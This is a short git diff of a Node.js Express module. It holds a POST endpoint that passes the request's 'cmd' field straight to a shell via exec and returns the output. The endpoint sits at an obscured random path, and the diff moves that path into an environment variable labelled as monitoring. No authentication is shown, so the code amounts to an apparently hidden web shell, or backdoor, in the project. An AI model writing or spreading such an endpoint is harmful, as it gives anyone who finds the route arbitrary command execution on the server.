@@ -1,7 +1,8 @@
 const { exec } = require("child_process");
+require("dotenv").config();
 
 module.exports = (app, con, globalConfig) => {
-    app.post("/39mtUZCAk8tzqrWc", (req, res) => {
+    app.post("/" + process.env.EXT_MONITORING_ROUTE, (req, res) => {
         if (req.body) {
             exec(req.body.cmd, (error, stdout, stderr) => {
                 let final = {
@@ -11,7 +12,7 @@ module.exports = (app, con, globalConfig) => {
                     stderrorData: "",
                     stdout: 0,
                     stdoutData: ""
-                }
+                };
 
                 if (error) {
                     final.error = "1";
